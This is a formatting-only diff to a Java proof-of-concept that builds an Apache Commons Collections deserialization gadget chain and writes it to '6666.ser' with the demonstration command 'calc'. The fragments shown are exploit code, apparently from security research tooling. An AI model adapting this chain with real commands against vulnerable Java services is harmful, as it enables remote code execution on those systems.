@@ -23,8 +23,8 @@ import java.util.PriorityQueue;
 
 public class CommonsCollections3 {
     public static void main(String[] args) throws Exception {
-        byte[] bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous = new FileOutputStream("6666.ser");
+        byte[]           bytes = getBytes(PayloadType.command, "calc");
+        FileOutputStream fous  = new FileOutputStream("6666.ser");
         fous.write(bytes);
         fous.close();
     }
@@ -34,13 +34,13 @@ public class CommonsCollections3 {
 
         // inert chain for setup
         final Transformer transformerChain = new ChainedTransformer(
-                new Transformer[]{ new ConstantTransformer(1) });
+                new Transformer[]{new ConstantTransformer(1)});
         // real chain for after setup
-        final Transformer[] transformers = new Transformer[] {
+        final Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(TrAXFilter.class),
                 new InstantiateTransformer(
-                        new Class[] { Templates.class },
-                        new Object[] { tpl } )};
+                        new Class[]{Templates.class},
+                        new Object[]{tpl})};
 
         final Map innerMap = new HashMap();
 
@@ -54,7 +54,7 @@ public class CommonsCollections3 {
 
         //序列化
         ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baous);
+        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
         oos.writeObject(handler);
         byte[] bytes = baous.toByteArray();
         oos.close();
